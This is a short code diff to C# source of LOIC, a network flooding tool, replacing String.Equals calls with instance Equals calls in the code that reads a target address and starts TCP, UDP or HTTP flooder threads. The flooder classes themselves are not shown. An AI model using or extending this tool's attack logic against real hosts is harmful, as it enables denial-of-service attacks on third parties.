@@ -80,7 +80,7 @@ namespace LOIC
 				}
 
 				sIP = txtTarget.Text;
-				if (String.IsNullOrEmpty (sIP) || String.Equals (sIP, "N O N E !")) {
+				if (String.IsNullOrEmpty(sIP) || sIP.Equals("N O N E !")) {
 					Wtf ("Select a target.", silent);
 					return;
 				}
@@ -119,7 +119,7 @@ namespace LOIC
 
 				cmdAttack.Text = "Stop flooding";
 
-				if(String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
+				if(sMethod.Equals("TCP") || sMethod.Equals("UDP"))
 				{
 					xxp = new XXPFlooder[iThreads];
 					for (int a = 0; a < xxp.Length; a++)
@@ -128,7 +128,7 @@ namespace LOIC
 						xxp[a].Start();
 					}
 				}
-				if(String.Equals(sMethod, "HTTP"))
+				if(sMethod.Equals("HTTP"))
 				{
 					http = new HTTPFlooder[iThreads];
 					for (int a = 0; a < http.Length; a++)
